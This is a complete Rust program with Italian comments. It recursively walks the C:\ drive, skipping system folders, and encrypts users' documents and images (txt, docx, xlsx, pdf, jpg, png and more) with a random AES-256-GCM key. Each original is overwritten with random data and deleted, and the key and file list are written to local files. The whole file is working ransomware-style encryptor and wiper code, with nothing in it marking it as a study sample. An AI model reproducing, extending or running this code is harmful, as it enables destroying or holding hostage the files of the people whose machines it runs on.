// importa i trait necessari per l'uso delle primitive di cifratura aes-gcm
use aes_gcm::aead::{Aead, KeyInit};
// importa il tipo di cifrario aes-256 in modalità gcm, la chiave e il nonce
use aes_gcm::{Aes256Gcm, Key, Nonce};
// importa il motore di codifica base64 standard per l'encoding dei nonce nei metadati
use base64::{Engine, engine::general_purpose::STANDARD};
// importa strumenti di generazione casuale
use rand::{RngCore, thread_rng};
// importa i tipi e funzioni di gestione errori e file
use std::error::Error;
use std::fs::{self, File};
use std::io::{BufWriter, Write};
// importa i tipi per manipolare percorsi
use std::path::{Path, PathBuf};
// importa la libreria walkdir per attraversare ricorsivamente il file system
use walkdir::WalkDir;

// elenco di directory da escludere dalla cifratura (sensibili o di sistema)
const EXCLUDED_DIRS: [&str; 5] = [
    "\\windows\\",
    "\\program files\\",
    "\\program files (x86)\\",
    "\\system volume information\\",
    "\\appdata\\",
];

// verifica se un file è valido per la cifratura: deve essere un file regolare, non in una directory esclusa, e con estensione consentita
fn is_valid_file(entry: &walkdir::DirEntry, allowed_ext: &[&str]) -> bool {
    let path = entry.path();
    if !path.is_file() {
        return false;
    }

    // converte il percorso in formato compatibile windows e lowercase per il confronto
    let path_str = path.to_string_lossy().to_lowercase().replace('/', "\\");

    // esclude i file che si trovano in directory vietate
    if EXCLUDED_DIRS.iter().any(|d| path_str.contains(d)) {
        return false;
    }

    // verifica che l’estensione sia tra quelle permesse
    path.extension()
        .and_then(|ext| ext.to_str())
        .map(|ext| allowed_ext.contains(&ext.to_lowercase().as_str()))
        .unwrap_or(false)
}

// cifra il contenuto del file passato come parametro e restituisce il payload cifrato, il nonce usato e l'estensione originale
fn encrypt_file(
    path: &Path,
    cipher: &Aes256Gcm,
) -> Result<(Vec<u8>, Vec<u8>, String), Box<dyn Error>> {
    // legge il contenuto del file
    let data = fs::read(path)?;

    // genera un nonce casuale di 12 byte (lunghezza standard per gcm)
    let mut nonce_bytes = [0u8; 12];
    thread_rng().fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    // cifra i dati usando il nonce generato
    let encrypted = cipher
        .encrypt(nonce, &data[..])
        .map_err(|e| format!("Encryption error: {}", e))?;

    // estrae l'estensione del file originale
    let extension = path
        .extension()
        .and_then(|ext| ext.to_str())
        .unwrap_or("")
        .to_string();

    // concatena nonce + dati cifrati in un singolo buffer
    let mut combined = nonce_bytes.to_vec();
    combined.extend_from_slice(&encrypted);

    Ok((combined, nonce_bytes.to_vec(), extension))
}

// sovrascrive il file originale con dati casuali e poi lo elimina dal disco
fn overwrite_and_delete(path: &Path) -> Result<(), Box<dyn Error>> {
    // limita la sovrascrittura a massimo 1mb per performance
    let len = fs::metadata(path)?.len().min(1024 * 1024);
    let random_data: Vec<u8> = (0..len).map(|_| rand::random::<u8>()).collect();
    fs::write(path, &random_data)?;
    fs::remove_file(path)?;
    Ok(())
}

// scrive i dati binari forniti in un file usando buffer per migliorare l'efficienza i/o
fn write_file<P: AsRef<Path>>(path: P, data: &[u8]) -> Result<(), Box<dyn Error>> {
    let file = File::create(path)?;
    let mut writer = BufWriter::new(file);
    writer.write_all(data)?;
    Ok(())
}

// genera un percorso univoco per un file cifrato, evitando conflitti in caso esista già un .enc
fn safe_enc_path(original: &Path) -> PathBuf {
    let mut new_path = original.with_extension("enc");
    let mut i = 1;
    while new_path.exists() {
        new_path = original.with_extension(format!("enc{}", i));
        i += 1;
    }
    new_path
}

// funzione principale: attraversa il disco, cifra i file validi e registra metadati e chiave
fn run() -> Result<(), Box<dyn Error>> {
    // estensioni di file ammesse alla cifratura
    let allowed_extensions = ["txt", "doc", "docx", "xls", "xlsx", "pdf", "jpg", "png"];

    // genera una chiave aes-256 casuale (32 byte)
    let key_bytes = {
        let mut key = [0u8; 32];
        thread_rng().fill_bytes(&mut key);
        key
    };

    // inizializza il cifrario aes256gcm con la chiave generata
    let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
    let cipher = Aes256Gcm::new(key);

    // vettore per contenere le informazioni sui file cifrati (path, nonce, estensione)
    let mut metadata = Vec::new();

    // esplora ricorsivamente il disco c:\
    for entry in WalkDir::new("C:/").into_iter().filter_map(Result::ok) {
        if is_valid_file(&entry, &allowed_extensions) {
            let path = entry.path();
            println!("Criptazione in corso: {}", path.display());

            // tenta la cifratura del file
            match encrypt_file(path, &cipher) {
                Ok((encrypted_data, nonce, extension)) => {
                    // genera un percorso sicuro per il file cifrato
                    let new_path = safe_enc_path(path);

                    // scrive il contenuto cifrato nel nuovo file
                    if let Err(e) = write_file(&new_path, &encrypted_data) {
                        eprintln!("Errore scrittura {}: {}", new_path.display(), e);
                        continue;
                    }

                    // sovrascrive e cancella il file originale
                    if let Err(e) = overwrite_and_delete(path) {
                        eprintln!("Errore cancellazione {}: {}", path.display(), e);
                        continue;
                    }

                    // salva nel metadato: path cifrato, nonce in base64, estensione originale
                    metadata.push(format!(
                        "{}:{}:{}",
                        new_path.display(),
                        STANDARD.encode(&nonce),
                        extension
                    ));
                }
                Err(e) => {
                    eprintln!("Errore crittografia {}: {}", path.display(), e);
                }
            }
        }
    }

    // salva la chiave simmetrica usata su disco
    write_file("key.bin", &key_bytes)?;
    // salva i metadati dei file cifrati
    write_file("metadata.txt", metadata.join("\n").as_bytes())?;

    println!("Operazione completata. Chiave salvata in key.bin, metadati in metadata.txt.");
    Ok(())
}

// entrypoint del programma, gestisce errori a livello globale
fn main() {
    if let Err(e) = run() {
        eprintln!("Errore: {}", e);
    }
}
